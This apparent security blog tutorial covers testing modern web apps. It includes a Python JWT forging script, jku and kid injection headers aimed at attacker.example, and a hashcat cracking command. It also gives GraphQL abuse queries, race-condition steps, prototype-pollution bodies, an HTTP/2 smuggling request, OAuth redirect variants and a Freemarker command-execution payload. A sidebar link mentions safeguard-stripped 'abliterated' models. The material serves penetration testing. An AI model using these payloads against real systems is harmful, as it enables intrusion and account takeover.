---
title: marginaldeer
source: https://www.marginaldeer.com//blog/modern-web-app-testing-techniques/
source_host: www.marginaldeer.com
clip_date: 2026-11-19T08:22:48+08:00
trace_id: c9a81df4-5fd0-40b6-aa02-79ed0d6be1ec
content_hash: 8e86d6f06e2b61931df9dedcae877df695b62462e1b37aa1dcb13cfecb76e05b
status: synced
tags: []
series: null
feed_source: marginaldeer·Android逆向
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41d75244-d011-81c6-8df7-f14a3ee64eb3
ioc: null
---

1.  Modern Web App Testing: JWT Abuse, GraphQL, Race Conditions, and Prototype Pollution
2.  [Abliterated Models for Web App Bug Bounty Hunting](https://www.marginaldeer.com/blog/abliterated-models-web-bug-bounty/)
3.  [Blind SQL Injection in SuiteCRM Reports, Through ORDER BY](https://www.marginaldeer.com/blog/suitecrm-order-by-sql-injection/)

SQLi, XSS, and CSRF still show up. On a current app they are rarely the whole assessment. The other surface is broken JWT validation, a GraphQL endpoint next to the REST API, race conditions in payment and redemption flows, prototype pollution in Node backends, and HTTP/2 downgrade bugs on the reverse proxy.

This post is the black-box pass. For Java source, start with [decompiling JARs and WARs with CFR](https://www.marginaldeer.com/blog/java-decompilation-cfr/). That post is its own series. This one will not show up in that series list.

## JWT

Decode the token from the cookie or `Authorization` header and read the header and claims. [jwt.io](https://jwt.io/) is fine for that. Then test the verification, not just the payload.

### Algorithm Confusion (RS256 to HS256)

If the server verifies RS256 with a public key, some libraries will accept a token you re-sign as HS256 using that public key as the HMAC secret.

Original header:

```json
{"alg":"RS256","typ":"JWT"}
```

Modified header:

```json
{"alg":"HS256","typ":"JWT"}
```

The HMAC secret has to be the exact bytes the server will use. A PEM file and the `n` / `e` values from a JWKS document are different byte strings. Try both. Burp’s JWT Editor extension does this without a script. From Python, PyJWT treats the second argument as the raw HMAC secret when the algorithm is HS256:

```python
import jwt

public_key = open("pubkey.pem", "rb").read()
token = jwt.encode(
    {"sub": "admin", "role": "administrator"},
    public_key,
    algorithm="HS256",
)
print(token)
```

A lot of current libraries pin the expected algorithm and reject this. It is still the first test, because older forks and hand-rolled verifiers do not.

### JKU and X5U

If the header has `jku` or `x5u`, the server may fetch a key from that URL.

```json
{"alg":"RS256","typ":"JWT","jku":"https://attacker.example/.well-known/jwks.json"}
```

Host a JWKS document with your key, sign the token with the matching private key, and see if the server trusts the URL. An allowlist on the host, or a pinned `kid`, stops this. A server that fetches whatever `jku` says does not.

### Kid Injection

`kid` selects the verification key. If that value is concatenated into a filesystem path or a SQL query, the selection itself is injectable.

```json
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
```

```json
{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'attacker-secret'--"}
```

The path case aims at a file whose contents you know, including an empty file, so you can HMAC with that content. The SQL case only matters when the key lookup is built with string concatenation.

### Weak Secrets and Missing Checks

-   Crack HS256 secrets with `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`. Mode 16500 wants the token itself.
-   Send `alg` of `none` with an empty signature. Some parsers still accept it.
-   Change role or subject claims only after you know the signature is not being checked.
-   Replay a token whose `exp` is in the past.

## GraphQL

Common paths are `/graphql`, `/api/graphql`, and `/v1/graphql`. Introspection, when it is left on, returns the schema:

```graphql
{
  __schema {
    types {
      name
      fields { name type { name } }
    }
  }
}
```

[GraphQL Voyager](https://github.com/APIs-guru/graphql-voyager) draws that schema. Burp’s InQL extension imports it and generates queries. With introspection disabled, a deliberately broken query often still produces field suggestions in the error text.

### Batching

The GraphQL spec is one operation per request. Apollo and a few other servers also accept a JSON array of operations in a single POST. Rate limits and auth middleware sometimes run once per HTTP request.

```json
[
  {"query": "{ me { id } }"},
  {"query": "{ adminPanel { secrets } }"}
]
```

Send it authenticated and unauthenticated. You are checking whether the second operation inherits a context it should not, or skips a check that the REST route enforces. That is a server bug when it happens. It is not guaranteed by the spec.

### Aliases

Aliases are the spec way to run one field more than once in a single operation. A field that changes state belongs in a mutation:

```graphql
mutation {
  a1: redeemCoupon(code: "SAVE10") { status }
  a2: redeemCoupon(code: "SAVE10") { status }
  a3: redeemCoupon(code: "SAVE10") { status }
}
```

One HTTP request, three resolver calls. Limits that count requests and ignore resolver executions miss this. Putting a mutation field in a `query` operation is a validation error, so the operation type has to match the field.

### IDOR on Root Fields and Nested Fields

A missing check on a second root field is a normal IDOR. It is not a nested-query bug:

```graphql
{
  me { id name }
  user(id: "00000000-0000-0000-0000-000000000001") {
    email
    orders { total paymentMethod }
  }
}
```

A nested field can fail separately, when the parent was authorized and the child resolver does not check the relationship:

```graphql
{
  me {
    id
    organization {
      users { email ssn }
    }
  }
}
```

Test both. The parent `me` being allowed does not mean every field under it was considered.

## Race Conditions

Look for actions that must happen once: coupon redemption, a vote, a credit, a password-reset token, a balance change. Send the same authenticated request many times so the requests overlap.

Burp Turbo Intruder is the tool that actually lines the requests up. Single-packet attack and last-byte sync exist to get them into the same processing window. A fuzzer with a high thread count sends parallel traffic, and it does not synchronize the last byte, so it is a weak test for this bug.

1.  Capture one valid `POST /api/redeem-coupon`.
2.  Replay about 20 copies with Turbo Intruder’s single-packet attack.
3.  Check whether the coupon, credit, or inventory change landed more than once.

The same shape applies to two transfers that each pass a balance check before either debit is committed:

```http
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"from":"A","to":"B","amount":100}
```

Fire a second transfer from A to C in the same window. If both succeed and A only had 100, the check and the debit are not atomic.

[racepwn](https://github.com/nccgroup/racepwn) is the CLI option when you do not want to do it in Burp.

## Prototype Pollution

Node backends that merge user JSON into an object with a recursive merge (`lodash` `merge` / `defaultsDeep`, and plenty of hand-rolled copies) can assign `__proto__` or `constructor.prototype` onto `Object.prototype`. `JSON.parse` by itself does not do that. In current Node, parsing this body produces an object with a normal property named `__proto__`:

```json
{"user":"test","__proto__":{"isAdmin":true}}
```

The constructor form is the same idea, and it still needs an unsafe merge:

```json
{"constructor":{"prototype":{"isAdmin":true}}}
```

Pollution is only interesting when some later check reads a property the object does not own, such as `user.isAdmin`, and inherits your value from `Object.prototype`. Confirm the merge in source if you have it. Grep for `merge`, `defaultsDeep`, `extend`, and recursive `assign` on request JSON.

A hit still needs a gadget before it is RCE or a real auth bypass:

-   A template engine that reads options from the merged object
-   `child_process` spawn options taken from a polluted prototype
-   A JWT or auth config object that inherits a property you set

[PPFuzzer](https://github.com/kleiton0x01/PPFuzzer) generates the payload variants. It does not find the gadget for you.

## HTTP/2 Request Smuggling

Some reverse proxies speak HTTP/2 to the client and downgrade to HTTP/1.1 for the backend. H2.CL is the case where the frontend trusts the HTTP/2 frame length and the backend trusts the `Content-Length` header on the downgraded request.

If that header is shorter than the body inside the HTTP/2 frame, the backend stops early. The leftover bytes sit on the connection and get parsed as the start of the next request. A content-length of 0 makes the whole body leftover:

```
:method POST
:path /
:authority target.example
content-length 0

GET /admin HTTP/1.1
Host: target.example

```

Downgraded, the backend sees a POST with `Content-Length: 0` and then a second request line, `GET /admin`. The length has to be an integer smaller than the body the frame actually carries. A length that does not match that rule is just a malformed request.

Burp’s HTTP/2 inspector is where you edit the pseudo-headers and the leftover body. PortSwigger’s [request smuggling](https://portswigger.net/web-security/request-smuggling) material covers detection (timing and response-queue diffs) better than a single payload will. Impact, when the desync is real, is cache poisoning or a request that bypasses a frontend control.

What to look at:

-   A CDN, WAF, or load balancer in front of a separate origin
-   A frontend and backend that disagree on HTTP/2 versus HTTP/1.1
-   Response timing or status codes that change when `Content-Length` is shorter than the frame body

## OAuth and OIDC

When the app sends you to `/oauth/authorize` or `/auth/callback`, test the redirect and the state value before you test the API behind the login.

### Redirect URI

Compare the registered callback with small variations:

```text
https://app.example/callback
https://app.example/callback/
https://app.example/callback/../../../admin
https://app.example/callback%00.evil.example
https://evil.example?@app.example/callback
https://app.example.evil.example
```

Weak string matching on the registered URI is the bug. An open redirect on the real callback host can be chained into the same theft.

### State

If `state` is missing or predictable, account-linking flows are CSRF. The victim’s browser can be sent through the provider and come back linked to an account you control.

### Where Tokens Leak

A token in the query string is sent to the server and can show up in `Referer` when the next page loads a third-party resource. A token in the URL fragment is not sent in `Referer` and is not sent to the server at all. Fragment tokens leak through script on the page, an open redirect that preserves the fragment, or the app copying `location.hash` into a request of its own.

### Scope

Ask for a scope the client did not register, or a broader scope than the user already consented to:

```text
scope=openid profile email admin
```

Some authorization servers grant the extra scope instead of ignoring it.

## Server-Side Template Injection

Anywhere user input is rendered by the server is a candidate: email templates, PDF generators, error pages, preview panes. Detection is a math probe. A `49` in the response means the engine evaluated it.

```text
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
```

Identify the engine from the syntax that worked and from error text, then use an engine-specific payload. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) is the cheat sheet.

Framework notes that keep coming up:

-   **Thymeleaf** (Spring) uses expression preprocessing. A typical probe looks like `__${7*7}__::.x`.
-   **Pebble** uses `{{ }}`, in the same family as Jinja2.
-   **Freemarker** `?new()` can build `freemarker.template.utility.Execute` on versions that still allow that built-in: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`. Newer incompatible-improvements settings block it.
-   **Handlebars and EJS** show up as the gadget once a Node merge bug has polluted options the template call reads.

With decompiled Java from [CFR](https://www.marginaldeer.com/blog/java-decompilation-cfr/), grep for the template import and follow user input into the render call. SQL injection, unsafe deserialization, and SpEL in that Java code are the follow-up for the Java series, not for this one.

## A Practical Workflow

After the baseline scan:

1.  **Map the API.** Crawl in Burp, run [Arjun](https://github.com/s0md3v/Arjun) for hidden parameters, and request `/graphql`, `/swagger.json`, `/openapi.json`, and `/.well-known/`. Run [JSFScan](https://github.com/KathanP19/JSFScan.sh) on the shipped JavaScript.
2.  **Test auth.** Decode JWTs and try algorithm confusion and `jku`. Check the OAuth `redirect_uri` and `state`. See whether refresh tokens and expired tokens are actually rejected.
3.  **Test state changes.** Race one-time actions in Turbo Intruder. Try GraphQL aliases on mutations, and Apollo-style batching if the server accepts an array. Send extra fields such as `{"role":"admin"}` on profile updates.
4.  **Test parsers.** Prototype-pollution payloads only count if something merges the JSON. SSTI probes go anywhere the server renders your input. URL fields, webhooks, and PDF fetchers get an SSRF attempt.
5.  **Test the edge.** HTTP/2 desync on apps behind a CDN or load balancer. Cache poisoning through unkeyed headers such as `X-Forwarded-Host` and `X-Original-URL`. CORS with `Access-Control-Allow-Credentials: true` reflected against an attacker origin.

## Quick Reference

| Technique | What to send | A real hit looks like |
| --- | --- | --- |
| JWT alg confusion | HS256 signed with the server’s public-key bytes | Forged token is accepted |
| JWT `jku` | `jku` pointing at your JWKS | Your key verifies the token |
| GraphQL aliases | One mutation, repeated with aliases | The one-time action runs more than once |
| GraphQL batching | JSON array of operations | Second operation skips an auth check |
| Race | About 20 overlapping copies of one request | Limit or balance applied more than once |
| Prototype pollution | `__proto__` via a merge, not `JSON.parse` alone | Inherited property changes a check |
| SSTI | `${7*7}` and the other probes | Response contains `49` |
| OAuth redirect | Variants of the registered callback | Code or token is sent to your host |

More to come.

If you enjoyed this post please consider subscribing to the [feed](https://www.marginaldeer.com/feed/)!
